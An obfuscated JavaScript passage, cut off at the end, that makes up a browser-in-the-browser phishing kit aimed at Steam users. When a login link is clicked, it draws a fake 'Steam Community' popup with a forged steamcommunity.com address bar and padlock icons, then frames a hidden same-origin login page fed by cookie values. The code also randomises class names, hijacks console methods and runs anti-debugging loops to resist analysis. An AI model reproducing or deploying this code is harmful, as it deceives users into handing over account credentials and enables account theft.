//récupération de la valeur du cookie après l'avoir mis en hachage MD5
var cookieValue = getCookies(md5Hash('cooookiiiiie' + document.location.hostname + 'cooookiiiiie'))
if (typeof cookieValue == 'string' && cookieValue.length > 0) {
    cookieValue = decodeString(decodeURI(cookieValue).replace(/%3D/gi, '=')) //%3D = '='
    if (typeof cookieValue == 'string' && cookieValue.length > 0) {
        cookieValue = atob(cookieValue)
        if (typeof cookieValue == 'string' && cookieValue.length > 0) {
            cookieValue = JSON.parse(cookieValue)
            if (typeof cookieValue == 'object' && Object.keys(cookieValue).length > 0) {
                let de77212630 = de775557b2('_auth_connect_goAuth_', 7, true),
                    de7725f2e1 = de775557b2('name_of_font__by_domain', 10, true)
                var de771a3ba4 = cookieValue.c1,
                    de77355485 = cookieValue.c2,
                    de7744bee1 = cookieValue.c3,
                    de7713783e = cookieValue.c4,
                    de773fdceb = cookieValue.c5,
                    de7773a95e = cookieValue.c6,
                    de7756de7b = cookieValue.c7,
                    isMobile = false
                if (
                    /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|ipad|iris|kindle|Android|Silk|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(
                        navigator.userAgent
                    ) ||
                    /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
                        navigator.userAgent.substr(0, 4)
                    )
                ) {
                    isMobile = true
                }
                if (isMobile === true || de7713783e === 'full') {
                    let de773b4d67 = de775557b2('_auth_full_cookie_name_', 15, false),
                        de77381a86 = de775557b2('_auth_full_cookie_value_', 9, false)
                    $(document).on(
                        'click',
                        '.' + de77212630 + ',.goAuth,a[href="/?login"]',
                        function () {
                            udpateCookie(de773b4d67, de77381a86)
                            window.location.href =
                                document.location.origin +
                                de7756de7b +
                                '?openid.ns=https%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2F' +
                                document.location.origin +
                                '%2F%3Flogin&openid.realm=https%3A%2F%2F' +
                                document.location.origin +
                                '&openid.ns.sreg=https%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=https%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=https%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select'
                            return false
                        }
                    )
                } else {
                    if (de7713783e === 'true') {
                        //generate random classname string for HTML/css
                        let de77818815 = randomString(randomNumber(7, 20), false),
                            de775306e8 = randomString(randomNumber(7, 20), false),
                            de775f102f = randomString(randomNumber(7, 20), false),
                            de771373f2 = randomString(randomNumber(7, 20), false),
                            de7722ef8d = randomString(randomNumber(7, 20), false),
                            de7724aeca = randomString(randomNumber(7, 20), false),
                            de773260cc = randomString(randomNumber(7, 20), false),
                            de7718675d = randomString(randomNumber(7, 20), false),
                            de77398042 = randomString(randomNumber(7, 20), false),
                            de773f8f67 = randomString(randomNumber(7, 20), false),
                            de77160114 = randomString(randomNumber(7, 20), false),
                            de775ddf94 = randomString(randomNumber(7, 20), false),
                            de771a44ba = randomString(randomNumber(7, 20), false),
                            de771ea7b4 = randomString(randomNumber(7, 20), false),
                            de77210430 = randomString(randomNumber(7, 20), false),
                            de77f61633 = randomString(randomNumber(7, 20), false),
                            de772d7371 = randomString(randomNumber(7, 20), false),
                            de772fd27f = randomString(randomNumber(7, 20), false),
                            de77495342 = randomString(randomNumber(7, 20), false),
                            de774c6df7 = randomString(randomNumber(7, 20), false),
                            de773ca9e1 = randomString(randomNumber(7, 20), false),
                            de7717977a = randomString(randomNumber(7, 20), false),
                            de7726f93c = randomString(randomNumber(7, 20), false),
                            de7739aabf = randomString(randomNumber(7, 20), false),
                            de77345113 = randomString(randomNumber(7, 20), false),
                            de774be232 = randomString(randomNumber(7, 20), false),
                            de775bd7d6 = randomString(randomNumber(7, 20), false),
                            de77300eb8 = randomString(randomNumber(7, 20), false),
                            de775b30f2 = randomString(randomNumber(7, 20), false),
                            de775b0516 = randomString(randomNumber(7, 20), false)
                        const de7728214b = {}
                        de7728214b['dark_b1.png'] = 'a'
                        de7728214b['dark_b1_hover.png'] = 'b'
                        de7728214b['dark_b2.png'] = 'c'
                        de7728214b['dark_b2_hover.png'] = 'd'
                        de7728214b['dark_b3.png'] = 'e'
                        de7728214b['dark_b3_hover.png'] = 'f'
                        de7728214b['dark_https1.png'] = 'g'
                        de7728214b['dark_https2.png'] = 'h'
                        de7728214b['dark_https3.png'] = 'i'
                        de7728214b['light_b1.png'] = 'j'
                        de7728214b['light_b1_hover.png'] = 'k'
                        de7728214b['light_b2.png'] = 'l'
                        de7728214b['light_b2_hover.png'] = 'm'
                        de7728214b['light_b3.png'] = 'n'
                        de7728214b['light_b3_hover.png'] = 'o'
                        de7728214b['light_https1.png'] = 'p'
                        de7728214b['light_https2.png'] = 'q'
                        de7728214b['light_https3.png'] = 'r'
                        de7728214b['favicon.png'] = 's'
                        let de773f622d = de7728214b,
                            de7741cfb9 = 'dark'
                        window.matchMedia &&
                            window.matchMedia('(prefers-color-scheme: dark)').matches
                            ? (de7741cfb9 = 'dark')
                            : (de7741cfb9 = 'light')
                        let de771e934f = 'rgb(241,243,244)',
                            de77188b0b = 'rgb(222,225,230)',
                            de77c7cf34 = '#000',
                            de778e33c3 = 'rgb(32,33,36)',
                            de77409a74 = 'rgb(105,106,108)',
                            de7737285a =
                                'background-color: rgb(241 243 244);border-top:1px solid rgb(178,178,178);border-bottom:1px solid rgb(178,178,178);',
                            de772e3be1 = 'rgb(241 243 244)',
                            de775bafd = 'rgb(32,33,36)',
                            de7740c365 = 'rgb(222,225,230)',
                            de772b8746 = 'rgb(171,171,171)',
                            de771ad0c6 =
                                'background-color:rgb(156,195,245);color:rgb(32,33,36);',
                            de7753cd3b = 'rgb(233,235,236)',
                            de7735f133 = 'rgb(241,243,244)'
                        if (de7741cfb9 === 'dark') {
                            de771e934f = 'rgb(32,33,36)'
                            de77188b0b = 'rgb(32,33,36)'
                            de77c7cf34 = '#fff'
                            de778e33c3 = '#fff'
                            de77409a74 = 'rgb(144,145,146)'
                            de7737285a =
                                'background-color: rgb(32 33 36);border-top:1px solid rgb(32 33 36);border-bottom:1px solid rgb(96,97,100);'
                            de772e3be1 = 'rgb(32,33,36)'
                            de775bafd = '#fff'
                            de7740c365 = 'rgb(32,33,36)'
                            de772b8746 = 'rgb(66,66,66)'
                            de771ad0c6 =
                                'background-color:rgb(83,102,133);color:rgb(255,255,255);'
                            de7753cd3b = 'rgb(41,42,45)'
                            de7735f133 = 'rgb(32,33,36)'
                        }
                        let de77981cfd = true,
                            de77365563 = '',
                            de77436ddd = '',
                            de7737aacf = '',
                            de775c6199 = ''
                        de77981cfd &&
                            ((de77365563 = 'border-radius:6px 6px 6px 6px;'),
                                (de77436ddd = 'border-radius:5px 5px 0 0;'),
                                (de7737aacf = 'border-radius:0px 5px 0px 0px;'),
                                (de775c6199 = 'border-radius:0 0 4px 4px;'))
                        $('body').append(
                            '<link rel="stylesheet" href="' +
                            window.location.origin +
                            de773fdceb +
                            de7773a95e[0] +
                            '"><style>.' +
                            de77818815 +
                            '{display:none;position:absolute;top:25px;left:25px;background-color:' +
                            de7740c365 +
                            ';border:1px solid ' +
                            de772b8746 +
                            ';box-shadow: rgba(0, 0, 0, 0.2) 0px -1px 10px;color:' +
                            de77c7cf34 +
                            ";z-index:999999999;font-family:'Segoe UI'," +
                            de7725f2e1 +
                            ';' +
                            de77365563 +
                            '}.' +
                            de77818815 +
                            ' *{box-sizing:content-box;}.' +
                            de77818815 +
                            ' *::selection{background-color:rgb(0 0 0 / 0%);}.' +
                            de77818815 +
                            ' *::-moz-selection{background-color:rgb(0 0 0 / 0%);}.' +
                            de775306e8 +
                            '{height:24px;background-color:' +
                            de77188b0b +
                            ';cursor:context-menu;padding:2px 11px;line-height:30px;' +
                            de77436ddd +
                            ';box-sizing: content-box !important;}.' +
                            de775306e8 +
                            ' div{font-size: 12px;display:inline-block;vertical-align:top}.' +
                            de775f102f +
                            '{background:url(data:image/png;base64,' +
                            de773f622d['favicon.png'] +
                            ') center center/16px 16px no-repeat;width:16px;height:16px;margin:3px 3px 0 -5px}.' +
                            de7722ef8d +
                            '{float:right;margin:0 6px 0 0;font-size:10px}.' +
                            de77210430 +
                            '-lock,.flaticon--custom-2:before{font-size:11px}.' +
                            de771a44ba +
                            '{height:calc(100% - 31px);background-color:' +
                            de7740c365 +
                            ';}.' +
                            de771ea7b4 +
                            '{' +
                            de7737285a +
                            'border-radius:0;line-height:26px}.' +
                            de77210430 +
                            '{width:31px;height:32px;float:left;color:green;padding:0 0 0 6px;white-space:nowrap}.' +
                            de77210430 +
                            '-label{margin:0 0 0 6px}.' +
                            de773ca9e1 +
                            '{border:0;padding:0;margin:0;overflow-y:scroll;overflow-x:hidden;width:100%;height:calc(100% - 31px);' +
                            de775c6199 +
                            '}.flaticon--custom-1:before{margin-left:20px}.flaticon--custom-1:hover{cursor:pointer;color:#ccc}.' +
                            de771373f2 +
                            '{margin:-3px 0 0 -3px}.' +
                            de773260cc +
                            ',.' +
                            de7718675d +
                            '{position:absolute;right:92px;top:0px}.' +
                            de77398042 +
                            ',.' +
                            de773f8f67 +
                            '{position:absolute;right:46px;top:0px;}.' +
                            de77160114 +
                            ',.' +
                            de775ddf94 +
                            '{position:absolute;right:0px;top:0px;' +
                            de7737aacf +
                            '}.' +
                            de77f61633 +
                            ',.' +
                            de772d7371 +
                            ',.' +
                            de775b0516 +
                            '{position:absolute;left:2px}.' +
                            de772fd27f +
                            '{height:32px;width:100%;background-color:' +
                            de771e934f +
                            ';transition:0.2s}@font-face{font-family: ' +
                            de7725f2e1 +
                            ';src:local("Segoe UI"),url(' +
                            window.location.origin +
                            de773fdceb +
                            de7773a95e[1] +
                            ') format("woff2"),url(' +
                            window.location.origin +
                            de773fdceb +
                            de7773a95e[2] +
                            ') format("woff"),url(' +
                            window.location.origin +
                            de773fdceb +
                            de7773a95e[3] +
                            ') format("truetype");font-weight: 400;}.' +
                            de77300eb8 +
                            '{color:' +
                            de778e33c3 +
                            ';float:left;}.' +
                            de775b30f2 +
                            '{width:calc(100% - 178px);text-overflow:ellipsis;color:' +
                            de77409a74 +
                            ';float:left;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}.' +
                            de774c6df7 +
                            '{font-weight: normal !important;cursor:text !important;line-height:33px !important;border:0 !important;background-color:' +
                            de771e934f +
                            ";height: 32px !important;font-family:'Segoe UI'," +
                            de7725f2e1 +
                            ' !important;font-size: 14px !important;margin:0 !important;padding:0 !important;transition:0.2s;transition-property:background-color;}.' +
                            de77495342 +
                            '{height:32px;display:none}.' +
                            de77495342 +
                            ' input{color:' +
                            de775bafd +
                            ';font-size: 14px;height: 32px;background-image: none;border: none;background-color: ' +
                            de772e3be1 +
                            ";font-weight: normal;outline: 0px;font-family:'Segoe UI'," +
                            de7725f2e1 +
                            ';padding: 0;margin: 0;width:calc(100% - 38px);cursor:text;line-height:26px}.' +
                            de77495342 +
                            ' input::selection{' +
                            de771ad0c6 +
                            '}.' +
                            de77495342 +
                            ' input::-moz-selection{' +
                            de771ad0c6 +
                            '}.' +
                            de774be232 +
                            '{width:45px;height:28px;transition: 0.2s;}.' +
                            de775bd7d6 +
                            '{width:34px;height:32px;transition:0.2s;}</style>'
                        )
                        $(document).on(
                            'mouseenter mouseleave',
                            '.' +
                            de772d7371 +
                            ',.' +
                            de7718675d +
                            ',.' +
                            de773f8f67 +
                            ',.' +
                            de775ddf94,
                            function (de771a68fd) {
                                if (de771a68fd.type === 'mouseenter') {
                                    $(this).css('opacity', '')
                                } else {
                                    de771a68fd.type === 'mouseleave' &&
                                        $(this).css('opacity', '0')
                                }
                            }
                        )
                        $(document).on(
                            'mouseenter mouseleave',
                            '.' + de772fd27f,
                            function (de772578ee) {
                                if (de772578ee.type === 'mouseenter') {
                                    $('.' + de772fd27f).css('background-color', de7753cd3b)
                                    $('.' + de774c6df7).css('background-color', de7753cd3b)
                                    $('.' + de775b0516).css('opacity', '')
                                } else {
                                    de772578ee.type === 'mouseleave' &&
                                        ($('.' + de772fd27f).css('background-color', de7735f133),
                                            $('.' + de774c6df7).css('background-color', de7735f133),
                                            $('.' + de775b0516).css('opacity', '0'))
                                }
                            }
                        )
                        $(document).on('click', '.' + de772fd27f, function () {
                            $(this).hide()
                            $('.' + de77495342 + ' input').val(
                                $('.' + de77495342 + ' input').val()
                            )
                            $('.' + de77495342).show()
                            $('.' + de77495342 + ' input').select()
                        })
                        $(document).on(
                            'focusout',
                            '.' + de77495342 + ' input',
                            function () {
                                $('.' + de77495342 + '').hide()
                                $('.' + de772fd27f).show()
                            }
                        )
                        $(document).on(
                            'click',
                            '.' + de7718675d + ',.' + de773f8f67 + ',.' + de775ddf94,
                            function () {
                                $('.' + de77818815).css({ display: 'none' })
                                $('.' + de773ca9e1)
                                    .html('')
                                    .prop('src', '')
                            }
                        )
                        $(document).on(
                            'click',
                            '.' + de77212630 + ',.goAuth,a[href="/?login"]',
                            function () {
                                $('.' + de77818815).remove()
                                var de775e20cb = func_titleBar_SetBrowserName()
                                if (de775e20cb) {
                                    de775e20cb = '- ' + de775e20cb
                                }
                                $('body').append(
                                    '\n\t\t\t\t\t\t\t\t<div class="' +
                                    de77818815 +
                                    '">\n\t\t\t\t\t\t\t\t\t<div class="' +
                                    de775306e8 +
                                    '">\n\t\t\t\t\t\t\t\t\t\t<div class="' +
                                    de775f102f +
                                    '"></div>\n\t\t\t\t\t\t\t\t\t\t<div class="' +
                                    de771373f2 +
                                    '">Steam Community <span class="' +
                                    de7724aeca +
                                    '">' +
                                    de775e20cb +
                                    '</span></div>\n\t\t\t\t\t\t\t\t\t\t<div class="' +
                                    de7722ef8d +
                                    '">\n\t\t\t\t\t\t\t\t\t\t\t<img class="' +
                                    de773260cc +
                                    ' ' +
                                    de774be232 +
                                    '" src="data:image/png;base64,' +
                                    de773f622d[de7741cfb9 + '_b1.png'] +
                                    '">\n\t\t\t\t\t\t\t\t\t\t\t<img class="' +
                                    de7718675d +
                                    ' ' +
                                    de774be232 +
                                    '" src="data:image/png;base64,' +
                                    de773f622d[de7741cfb9 + '_b1_hover.png'] +
                                    '" style="opacity:0;">\n\t\t\t\t\t\t\t\t\t\t\t<img class="' +
                                    de77398042 +
                                    ' ' +
                                    de774be232 +
                                    '" src="data:image/png;base64,' +
                                    de773f622d[de7741cfb9 + '_b2.png'] +
                                    '">\n\t\t\t\t\t\t\t\t\t\t\t<img class="' +
                                    de773f8f67 +
                                    ' ' +
                                    de774be232 +
                                    '" src="data:image/png;base64,' +
                                    de773f622d[de7741cfb9 + '_b2_hover.png'] +
                                    '" style="opacity:0;">\n\t\t\t\t\t\t\t\t\t\t\t<img class="' +
                                    de77160114 +
                                    ' ' +
                                    de774be232 +
                                    '" src="data:image/png;base64,' +
                                    de773f622d[de7741cfb9 + '_b3.png'] +
                                    '">\n\t\t\t\t\t\t\t\t\t\t\t<img class="' +
                                    de775ddf94 +
                                    ' ' +
                                    de774be232 +
                                    '" src="data:image/png;base64,' +
                                    de773f622d[de7741cfb9 + '_b3_hover.png'] +
                                    '" style="opacity:0;">\n\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t<div class="' +
                                    de771a44ba +
                                    '">\n\t\t\t\t\t\t\t\t\t\t<div class="' +
                                    de771ea7b4 +
                                    '">\n\t\t\t\t\t\t\t\t\t\t\t<div class="' +
                                    de77210430 +
                                    '">\n\t\t\t\t\t\t\t\t\t\t\t\t<img class="' +
                                    de77f61633 +
                                    ' ' +
                                    de775bd7d6 +
                                    '" src="data:image/png;base64,' +
                                    de773f622d[de7741cfb9 + '_https1.png'] +
                                    '">\n\t\t\t\t\t\t\t\t\t\t\t\t<img class="' +
                                    de775b0516 +
                                    ' ' +
                                    de775bd7d6 +
                                    '" src="data:image/png;base64,' +
                                    de773f622d[de7741cfb9 + '_https3.png'] +
                                    '" style="opacity:0;">\n\t\t\t\t\t\t\t\t\t\t\t\t<img class="' +
                                    de772d7371 +
                                    ' ' +
                                    de775bd7d6 +
                                    '" src="data:image/png;base64,' +
                                    de773f622d[de7741cfb9 + '_https2.png'] +
                                    '" style="opacity:0;">\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t\t<div class="' +
                                    de772fd27f +
                                    '">\n\t\t\t\t\t\t\t\t\t\t\t\t<span class="' +
                                    de774c6df7 +
                                    ' ' +
                                    de77300eb8 +
                                    '">steamcommunity.com</span>\n\t\t\t\t\t\t\t\t\t\t\t\t<span class="' +
                                    de774c6df7 +
                                    ' ' +
                                    de775b30f2 +
                                    '">/openid/loginform/?openid.ns=https%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2F' +
                                    document.location.origin +
                                    '%2F%3Flogin&openid.realm=https%3A%2F%2F' +
                                    document.location.origin +
                                    '&openid.ns.sreg=https%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=https%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=https%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select</span>\n\t\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t\t<div class="' +
                                    de77495342 +
                                    '"><input type="text" value="steamcommunity.com/openid/loginform/?openid.ns=https%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=checkid_setup&openid.return_to=https%3A%2F%2F' +
                                    document.location.origin +
                                    '%2F%3Flogin&openid.realm=https%3A%2F%2F' +
                                    document.location.origin +
                                    '&openid.ns.sreg=https%3A%2F%2Fopenid.net%2Fextensions%2Fsreg%2F1.1&openid.claimed_id=https%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=https%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"></div>\n\t\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\t\t<iframe class="' +
                                    de773ca9e1 +
                                    '" src=""></iframe>\n\t\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t'
                                )
                                let de771ce829 = 840,
                                    de774e1c08 = window.screen.height - 50 - 125
                                if (de771ce829 > de774e1c08) {
                                    de771ce829 = de774e1c08
                                }
                                if (de771ce829 < 710) {
                                    de771ce829 = 710
                                }
                                $('.' + de77818815).css({
                                    width: '1018px',
                                    height: de771ce829 + 'px',
                                    display: 'block',
                                })
                                $('.' + de773ca9e1).prop(
                                    'src',
                                    document.location.origin +
                                    '/' +
                                    atob(atob(de771a3ba4.substring(1))) +
                                    '/' +
                                    randomString(10, true) +
                                    '/' +
                                    randomString(10, true) +
                                    '?q=' +
                                    getCookies(de77355485) +
                                    '&s=' +
                                    getCookies(de7744bee1)
                                )
                                $('.' + de77495342 + ' input').keypress(function (de7766bb0a) {
                                    if (de7766bb0a.which == 13) {
                                        $('.' + de77495342).hide()
                                        $('.' + de772fd27f).show()
                                    }
                                })
                                const de774a6817 = { containment: 'window' }
                                $('.' + de77818815).draggable(de774a6817)
                                const de773f2ab0 = {
                                    minHeight: 362,
                                    minWidth: 362,
                                }
                                $('.' + de77818815).resizable(de773f2ab0)
                                return false
                            }
                        )
                        function func_titleBar_SetBrowserName() {
                            if (!!window.chrome && !!window.chrome.webstore) {
                                return 'Google Chrome'
                            } else {
                                if (typeof InstallTrigger !== 'undefined') {
                                    return 'Mozilla Firefox'
                                } else {
                                    if (
                                        (!!window.opr && !!opr.addons) ||
                                        !!window.opera ||
                                        navigator.userAgent.indexOf(' OPR/') >= 0
                                    ) {
                                        return navigator.userAgent.indexOf(' OPR/') >= 0
                                            ? 'Opera'
                                            : 'Google Chrome'
                                    } else {
                                        if (
                                            /constructor/i.test(window.HTMLElement) ||
                                            (function (de77982423) {
                                                return (
                                                    de77982423.toString() ===
                                                    '[object SafariRemoteNotification]'
                                                )
                                            })(
                                                !window.safari ||
                                                (typeof safari !== 'undefined' &&
                                                    safari.pushNotification)
                                            )
                                        ) {
                                            return 'Safari'
                                        } else {
                                            if (
                                                typeof isIE != 'undefined' &&
                                                !isIE &&
                                                !!window.StyleMedia
                                            ) {
                                                return 'Edge'
                                            } else {
                                                if (
                                                    ((typeof isChrome != 'undefined' && isChrome) ||
                                                        (typeof isOpera != 'undefined' && isOpera)) &&
                                                    !!window.CSS
                                                ) {
                                                    return 'Google Chrome'
                                                } else {
                                                    if (!!window.chrome) {
                                                        if (navigator.userAgent.indexOf(' OPR/') != -1) {
                                                            return 'Opera'
                                                        } else {
                                                            if (
                                                                navigator.userAgent.indexOf(' YaBrowser/') != -1
                                                            ) {
                                                                return 'Yandex'
                                                            } else {
                                                                return navigator.userAgent.indexOf(' Edge/') !=
                                                                    -1
                                                                    ? 'Microsoft Edge'
                                                                    : 'Google Chrome'
                                                            }
                                                        }
                                                    } else {
                                                        return ''
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    } else {
                        $(document).on(
                            'click',
                            '.' + de77212630 + ',.goAuth,a[href="/?login"]',
                            function () {
                                var de773dd415 = window.open(
                                    '',
                                    '',
                                    'STATUS=NO, TOOLBAR=NO, LOCATION=0, DIRECTORIES=0, RESISABLE=NO, SCROLLBARS=YES, TOP=50, LEFT=50, WIDTH=1004, HEIGHT=800'
                                )
                                de773dd415.document.write(
                                    "<html style='overflow:hidden;'><head><title>Steam Community</title><style>html, body {width:1004px; height:800px; margin:0px; padding:0px;}</style></head><body><iframe src='" +
                                    document.location.origin +
                                    '/' +
                                    atob(atob(de771a3ba4.substring(1))) +
                                    '/' +
                                    randomString(10, true) +
                                    '/' +
                                    randomString(10, true) +
                                    '?q=' +
                                    getCookies(de77355485) +
                                    '&s=' +
                                    getCookies(de7744bee1) +
                                    "' border='0' style='width:100vw;height:100vh;border:none;'></iframe></body></html>"
                                )
                                return false
                            }
                        )
                    }
                }
                function de775557b2(baseString, length, includeFirstLowercase) {
                    let hash = md5Hash(baseString + document.location.hostname + baseString)
                    if (includeFirstLowercase) {
                        let firstLowerChar = 'm',
                            charArray = hash.split('')
                        for (let charPos in charArray) {
                            if (isLowerChar(charArray[charPos]) === true) {
                                firstLowerChar = charArray[charPos]
                                break
                            }
                        }
                        return firstLowerChar + hash.substr(10, length - 1)
                    } else {
                        return hash.substr(10, length)
                    }
                }

                function isLowerChar(char) {
                    return 'abcdefghijklmnopqrstuvwxyz'.indexOf(char) !== -1
                        ? true
                        : false
                }

                function randomString(arg_Length, arg_useNumber) {
                    const de7720af76 = (function () {
                        let de77e64d57 = true
                        return function (de772bbeb5, de7724e190) {
                            const de7728dc16 = de77e64d57
                                ? function () {
                                    if (de7724e190) {
                                        const de778d9856 = de7724e190.apply(
                                            de772bbeb5,
                                            arguments
                                        )
                                        return (de7724e190 = null), de778d9856
                                    }
                                }
                                : function () { }
                            return (de77e64d57 = false), de7728dc16
                        }
                    })(),
                        de775e1f8c = de7720af76(this, function () {
                            let de7719f1b9
                            try {
                                const de779b24cb = Function(
                                    'return (function() {}.constructor("return this")( ));'
                                )
                                de7719f1b9 = de779b24cb()
                            } catch (de77391311) {
                                de7719f1b9 = window
                            }
                            const de774d7a60 = (de7719f1b9.console =
                                de7719f1b9.console || {}),
                                de773a8319 = [
                                    'log',
                                    'warn',
                                    'info',
                                    'error',
                                    'exception',
                                    'table',
                                    'trace',
                                ]
                            for (
                                let de775bde69 = 0;
                                de775bde69 < de773a8319.length;
                                de775bde69++
                            ) {
                                const de77590aa9 =
                                    de7720af76.constructor.prototype.bind(de7720af76),
                                    de77e8d0c0 = de773a8319[de775bde69],
                                    de77458530 = de774d7a60[de77e8d0c0] || de77590aa9
                                de77590aa9['__proto__'] = de7720af76.bind(de7720af76)
                                de77590aa9.toString = de77458530.toString.bind(de77458530)
                                de774d7a60[de77e8d0c0] = de77590aa9
                            }
                        })
                    de775e1f8c()
                    var result = '',
                        randomChars = 'abcdefghijklmnopqrstuvwxyz'
                    if (arg_useNumber == true) {
                        randomChars += '0123456789'
                    }
                    for (var index = 0; index < arg_Length; index++) {
                        result += randomChars.charAt(
                            Math.floor(Math.random() * randomChars.length)
                        )
                    }
                    return result
                }
                function randomNumber(min, max = 0) {
                    const de773017a3 = (function () {
                        let de7734416f = true
                        return function (de7731dcb2, de7777a227) {
                            const de77524c61 = de7734416f
                                ? function () {
                                    if (de7777a227) {
                                        const de7713072e = de7777a227.apply(
                                            de7731dcb2,
                                            arguments
                                        )
                                        return (de7777a227 = null), de7713072e
                                    }
                                }
                                : function () { }
                            return (de7734416f = false), de77524c61
                        }
                    })(),
                        de7715b157 = de773017a3(this, function () {
                            return de7715b157
                                .toString()
                                .search('(((.+)+)+)+$')
                                .toString()
                                .constructor(de7715b157)
                                .search('(((.+)+)+)+$')
                        })
                    de7715b157()
                    const de7751cddc = (function () {
                        let de774d9589 = true
                        return function (de7723788b, de771713db) {
                            const de7743488a = de774d9589
                                ? function () {
                                    if (de771713db) {
                                        const de772da63d = de771713db.apply(de7723788b, arguments)
                                        return (de771713db = null), de772da63d
                                    }
                                }
                                : function () { }
                            return (de774d9589 = false), de7743488a
                        }
                    })()
                    return (
                        (function () {
                            de7751cddc(this, function () {
                                const de77ab4be3 = new RegExp('function *\\( *\\)'),
                                    de774418aa = new RegExp(
                                        '\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)',
                                        'i'
                                    ),
                                    de775d62ae = runtimeDebuggerPrevention('init')
                                if (
                                    !de77ab4be3.test(de775d62ae + 'chain') ||
                                    !de774418aa.test(de775d62ae + 'input')
                                ) {
                                    de775d62ae('0')
                                } else {
                                    runtimeDebuggerPrevention()
                                }
                            })()
                        })(),
                        Math.floor(Math.random() * (min - max) + max)
                    )
                }
            }
        }
    }
}
function getCookies(arg_cookiename) {
    var result = document.cookie.match('(^|; )' + arg_cookiename + '=([^;]*)')
    if (result && result[2]) {
        return result[2]
    } else {
        return null
    }
}
; (function () {
    let de772faee4
    try {
        const de7711d193 = Function(
            'return (function() {}.constructor("return this")( ));'
        )
        de772faee4 = de7711d193()
    } catch (de77530a03) {
        de772faee4 = window
    }
    de772faee4.setInterval(runtimeDebuggerPrevention, 3000)
})()
function udpateCookie(name, value, options = {}) {
    var expires = options.expires
    if (typeof expires == 'number' && expires) {
        var date = new Date()
        date.setTime(date.getTime() + expires * 1000)
        expires = options.expires = date
    }
    if (expires && expires.toUTCString) {
        options.expires = expires.toUTCString()
    }
    value = encodeURIComponent(value)
    var updatedCookie = name + '=' + value
    for (var propName in options) {
        updatedCookie += '; ' + propName
        var propValue = options[propName]
        if (propValue !== true) {
            updatedCookie += '=' + propValue
        }
